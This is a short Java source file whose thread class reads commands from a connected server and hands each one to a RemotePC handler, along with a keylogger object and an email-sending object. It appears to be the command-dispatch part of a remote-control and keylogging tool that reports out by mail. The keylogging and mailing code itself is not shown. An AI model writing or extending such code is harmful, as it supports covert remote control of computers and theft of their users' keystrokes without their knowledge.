package email;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class ClientThreading extends Thread {

  Socket socket;
  BufferedReader reader;
  PrintWriter writer;
  KeyLog keylog;
  SendMail send ;

  public ClientThreading(Socket socket, KeyLog keylog , SendMail send)  {
    this.socket = socket;
    this.keylog = keylog;
    this.send = send;
    try {
      this.reader =
        new BufferedReader(new InputStreamReader(this.socket.getInputStream()));
      this.writer = new PrintWriter(this.socket.getOutputStream(), true);
    } catch (Exception e) {
      System.out.println(e);
    }
  }

  public void run() {
    try {
      System.out.println("Client connected");
      String line;
      System.out.println(reader.readLine());
      List<String> task = new ArrayList<>();
      while (!(line = this.reader.readLine()).equals("end")) {
        task.add(line);
      }
      for (String s : task) {
        System.out.println("server  ==>  " + s);
        RemotePC remote = new RemotePC(s, this.keylog , send);
        remote.run();
      }
      socket.close();
      System.out.println("Client disconnected");
    } catch (Exception e) {
      System.out.println(e);
    }
  }
}
